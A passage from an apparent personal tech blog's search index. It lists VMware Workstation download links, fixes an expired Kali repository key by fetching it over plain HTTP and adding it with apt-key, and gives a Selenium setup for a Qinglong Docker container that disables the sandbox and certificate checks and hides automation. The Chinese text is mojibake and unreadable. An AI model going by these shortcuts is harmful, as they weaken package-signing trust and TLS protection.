      <title>VMware Workstation Pro è™šæ‹Ÿæœºè½¯ä»¶ä¸“ä¸šç‰ˆ</title>
      <link href="/2023/03/21/VMware%20Workstation%20Pro%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BD%AF%E4%BB%B6%E4%B8%93%E4%B8%9A%E7%89%88/"/>
      <url>/2023/03/21/VMware%20Workstation%20Pro%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BD%AF%E4%BB%B6%E4%B8%93%E4%B8%9A%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>VMWare Workstation æ˜¯æ¶ˆè´¹çº§è™šæ‹Ÿæœºè½¯ä»¶ä¸­çš„å½“ä¹‹æ— æ„§çš„è€å¤§ï¼Œæ— è®ºä»æ€§èƒ½ä¸Šè¿˜æ˜¯å‘¨è¾¹çš„å„ç§åŠŸèƒ½ä¸Šéƒ½æ¯”å…¶ä»–äº§å“è¦å¼ºå¤§å¾—å¤šï¼Œå¦‚æœä½ è¿½æ±‚æ›´å…¨é¢çš„åŠŸèƒ½ï¼Œæ›´å¤šçš„æŠ€æœ¯ç‰¹æ€§ï¼Œé‚£ä¹ˆä½ ä¸€å®šè¦è¯•è¯• Workstationã€‚<br><strong>ä¸‹è½½åœ°å€</strong><br>VMware Workstation 17.0.1 Pro for Windows<br><a href="https://download3.vmware.com/software/WKST-1701-WIN/VMware-workstation-full-17.0.1-21139696.exe">https://download3.vmware.com/software/WKST-1701-WIN/VMware-workstation-full-17.0.1-21139696.exe</a></p><p>VMware Workstation 17.0.0 Pro for Windows<br><a href="https://download3.vmware.com/software/WKST-1700-WIN/VMware-workstation-full-17.0.0-20800274.exe">https://download3.vmware.com/software/WKST-1700-WIN/VMware-workstation-full-17.0.0-20800274.exe</a></p><p>VMware Workstation Pro 16.2.4 Build 20089737<br><a href="https://download3.vmware.com/software/WKST-1624-WIN/VMware-workstation-full-16.2.4-20089737.exe">https://download3.vmware.com/software/WKST-1624-WIN/VMware-workstation-full-16.2.4-20089737.exe</a></p><p>VMware Workstation Pro 16.2.3 Build 19376536<br><a href="https://download3.vmware.com/software/WKST-1623-WIN-New/VMware-workstation-full-16.2.3-19376536.exe">https://download3.vmware.com/software/WKST-1623-WIN-New/VMware-workstation-full-16.2.3-19376536.exe</a></p><p>VMware Workstation Pro 16.2.2 Build 19200509<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.2.2-19200509.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.2.2-19200509.exe</a></p><p>VMware Workstation Pro 16.2.0 Build 18760230<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.2.0-18760230.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.2.0-18760230.exe</a></p><p>VMware Workstation Pro 16.1.2 Build 17966106<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.2-17966106.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.2-17966106.exe</a></p><p>VMware Workstation Pro 16.1.1 Build 17801498<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.1-17801498.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.1-17801498.exe</a></p><p>VMware Workstation Pro 16.1.0 Build 17198959<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.0-17198959.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.0-17198959.exe</a></p><p>VMware Workstation Pro 16.0.0 Build 16894299<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.0.0-16894299.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.0.0-16894299.exe</a></p><p>VMware Workstation Pro 15.5.6 Build 16341506<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.6-16341506.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.6-16341506.exe</a></p><p>VMware Workstation Pro 15.5.5 Build 16285975<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.5-16285975.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.5-16285975.exe</a></p><p>VMware Workstation Pro 15.5.2 Build 15785246<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.2-15785246.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.2-15785246.exe</a></p><p>VMware Workstation Pro 15.5.1 Build 15018445<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe</a></p><p>VMware Workstation Pro 15.5.0 Build 14665864<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.0-14665864.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.0-14665864.exe</a></p><p>VMware Workstation Pro 15.1.0 Build 13591040<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.1.0-13591040.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.1.0-13591040.exe</a></p><p>VMware Workstation Pro 14.1.3 Build 9474260<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-14.1.3-9474260.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-14.1.3-9474260.exe</a></p><p>VMware Workstation Pro 12.5.9 Build 7535481<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-12.5.9-7535481.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-12.5.9-7535481.exe</a></p><p>VMware Workstation 10.0.7 Build 2844087<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-10.0.7-2844087.exe">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-10.0.7-2844087.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> å…è´¹èµ„æº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VMware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>W æ ¡éªŒæ•°å­—ç­¾åæ—¶å‡ºé”™ã€‚æ­¤ä»“åº“æœªè¢«æ›´æ–°ï¼Œæ‰€ä»¥ä»ç„¶ä½¿ç”¨æ­¤å‰çš„ç´¢å¼•æ–‡ä»¶ã€‚GPG é”™è¯¯ï¼šhttpmirrors.ustc.edu.cnkali kali-rolling</title>
      <link href="/2023/02/26/W%20%E6%A0%A1%E9%AA%8C%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E6%97%B6%E5%87%BA%E9%94%99%E3%80%82%E6%AD%A4%E4%BB%93%E5%BA%93%E6%9C%AA%E8%A2%AB%E6%9B%B4%E6%96%B0%EF%BC%8C%E6%89%80%E4%BB%A5%E4%BB%8D%E7%84%B6%E4%BD%BF%E7%94%A8%E6%AD%A4%E5%89%8D%E7%9A%84%E7%B4%A2%E5%BC%95%E6%96%87%E4%BB%B6%E3%80%82GPG%20%E9%94%99%E8%AF%AF%EF%BC%9Ahttpmirrors.ustc.edu.cnkali%20kali-rolling/"/>
      <url>/2023/02/26/W%20%E6%A0%A1%E9%AA%8C%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E6%97%B6%E5%87%BA%E9%94%99%E3%80%82%E6%AD%A4%E4%BB%93%E5%BA%93%E6%9C%AA%E8%A2%AB%E6%9B%B4%E6%96%B0%EF%BC%8C%E6%89%80%E4%BB%A5%E4%BB%8D%E7%84%B6%E4%BD%BF%E7%94%A8%E6%AD%A4%E5%89%8D%E7%9A%84%E7%B4%A2%E5%BC%95%E6%96%87%E4%BB%B6%E3%80%82GPG%20%E9%94%99%E8%AF%AF%EF%BC%9Ahttpmirrors.ustc.edu.cnkali%20kali-rolling/</url>
      
        <content type="html"><![CDATA[<p>æŠ¥é”™å¦‚ä¸‹</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~]â””â”€# sudo apt-get update                                                                                                                                                     2 âš™è·å–:1 http://kali.download/kali kali-rolling InRelease [41.2 kB]é”™è¯¯:1 http://kali.download/kali kali-rolling InRelease  ä¸‹åˆ—ç­¾åæ— æ•ˆï¼š EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;å·²ä¸‹è½½ 41.2 kBï¼Œè€—æ—¶ 3ç§’ (15.7 kB/s)æ­£åœ¨è¯»å–è½¯ä»¶åŒ…åˆ—è¡¨... å®ŒæˆW: æ ¡éªŒæ•°å­—ç­¾åæ—¶å‡ºé”™ã€‚æ­¤ä»“åº“æœªè¢«æ›´æ–°ï¼Œæ‰€ä»¥ä»ç„¶ä½¿ç”¨æ­¤å‰çš„ç´¢å¼•æ–‡ä»¶ã€‚GPG é”™è¯¯ï¼šhttp://kali.download/kali kali-rolling InRelease: ä¸‹åˆ—ç­¾åæ— æ•ˆï¼š EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;W: æ— æ³•ä¸‹è½½ http://http.kali.org/kali/dists/kali-rolling/InRelease  ä¸‹åˆ—ç­¾åæ— æ•ˆï¼š EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;W: éƒ¨åˆ†ç´¢å¼•æ–‡ä»¶ä¸‹è½½å¤±è´¥ã€‚å¦‚æœå¿½ç•¥å®ƒä»¬ï¼Œé‚£å°†è½¬è€Œä½¿ç”¨æ—§çš„ç´¢å¼•æ–‡ä»¶ã€‚                                                                                                                                                                                â”Œâ”€â”€(rootğŸ’€kali)-[~]â””â”€# wget archive.kali.org/archive-key.asc                                                                                                                                   2 âš™--2023-02-26 06:31:16--  http://archive.kali.org/archive-key.ascæ­£åœ¨è§£æä¸»æœº archive.kali.org (archive.kali.org)... 192.99.45.140æ­£åœ¨è¿æ¥ archive.kali.org (archive.kali.org)|192.99.45.140|:80... å·²è¿æ¥ã€‚å·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OKé•¿åº¦ï¼š3155 (3.1K) [application/octet-stream]æ­£åœ¨ä¿å­˜è‡³: â€œarchive-key.ascâ€archive-key.asc            100%[===============================&gt;]   3.08K  1.46KB/s  ç”¨æ—¶ 2.1s    2023-02-26 06:31:20 (1.46 KB/s) - å·²ä¿å­˜ â€œarchive-key.ascâ€ [3155/3155])</code></pre><p>â€‹<br>â€‹    â”Œâ”€â”€(rootğŸ’€kali)-[<del>]<br>â€‹    â””â”€# apt-key add archive-key.asc                                                                                                                                             2 âš™<br>â€‹    Warning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).<br>â€‹    OK<br>â€‹<br>â€‹    â”Œâ”€â”€(rootğŸ’€kali)-[</del>]<br>â€‹    â””â”€# sudo apt-get update                                                                                                                                                     2 âš™<br>â€‹    è·å–:1 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling InRelease [41.2 kB]<br>â€‹    è·å–:2 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling&#x2F;main amd64 Packages [19.5 MB]<br>â€‹    è·å–:3 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling&#x2F;main amd64 Contents (deb) [45.4 MB]<br>â€‹    è·å–:4 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling&#x2F;contrib amd64 Packages [116 kB]<br>â€‹    è·å–:5 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling&#x2F;contrib amd64 Contents (deb) [172 kB]<br>â€‹    è·å–:6 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling&#x2F;non-free amd64 Packages [222 kB]<br>â€‹    è·å–:7 <a href="http://kali.download/kali">http://kali.download/kali</a> kali-rolling&#x2F;non-free amd64 Contents (deb) [931 kB]<br>â€‹    å·²ä¸‹è½½ 66.3 MBï¼Œè€—æ—¶ 49ç§’ (1,360 kB&#x2F;s)<br>â€‹    æ­£åœ¨è¯»å–è½¯ä»¶åŒ…åˆ—è¡¨â€¦ å®Œæˆ</p><p>è§£å†³æ–¹æ³•å¦‚ä¸‹</p><pre><code>wget archive.kali.org/archive-key.asc   //ä¸‹è½½ç­¾åapt-key add archive-key.asc   //å®‰è£…ç­¾å</code></pre>]]></content>
      
      
      <categories>
          
          <category> é‡åˆ°çš„é—®é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é’é¾™é¢æ¿ä½¿ç”¨seleniumé‡åˆ°çš„é—®é¢˜ chromedriver</title>
      <link href="/2023/02/18/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E4%BD%BF%E7%94%A8selenium%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%20chromedriver/"/>
      <url>/2023/02/18/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E4%BD%BF%E7%94%A8selenium%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%20chromedriver/</url>
      
        <content type="html"><![CDATA[<p>é’é¾™é‡Œçš„linuxç³»ç»Ÿæ˜¯è½»é‡çº§çš„Alpine Linux é•œåƒï¼Œæ‰€ä»¥å®‰è£…å‘½ä»¤ä¸æ˜¯yumä¹Ÿä¸æ˜¯aptï¼Œè€Œæ˜¯apk</p><p>1.å…ˆå®‰è£…seleniumä¾èµ–</p><p>è¿™é‡Œä¸å†åšä»‹ç»ï¼Œè‡ªè¡Œç™¾åº¦</p><p>2.è¿›å…¥é’é¾™ docker å®¹å™¨</p><pre><code>docker exec -it &#39;å®¹å™¨åç§°&#39; bash#æˆ–docker exec -it &#39;å®¹å™¨ID&#39; bash</code></pre><p>3.å®‰è£…chromium</p><pre><code>apk add chromium</code></pre><p>4.å®‰è£…chromedriver</p><pre><code>apk add chromium-chromedriver</code></pre><p>5.ä½¿ç”¨ä»¥ä¸‹ä»£ç æµ‹è¯•</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver <span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>chrome<span class="token punctuation">.</span>options <span class="token keyword">import</span> Optionsoptions <span class="token operator">=</span> Options<span class="token punctuation">(</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--headless'</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--disable-dev-shm-usage'</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-blink-features=AutomationControlled"</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_experimental_option<span class="token punctuation">(</span><span class="token string">"excludeSwitches"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"enable-automation"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--ignore-certificate-errors'</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_experimental_option<span class="token punctuation">(</span><span class="token string">"excludeSwitches"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"enable-logging"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_experimental_option<span class="token punctuation">(</span><span class="token string">'useAutomationExtension'</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>browser <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>options<span class="token operator">=</span>options<span class="token punctuation">)</span>browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>browser<span class="token punctuation">.</span>title<span class="token punctuation">)</span> browser<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> é‡åˆ°çš„é—®é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é’é¾™é¢æ¿ </tag>
            
            <tag> Python </tag>
            
            <tag> chromedriver </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
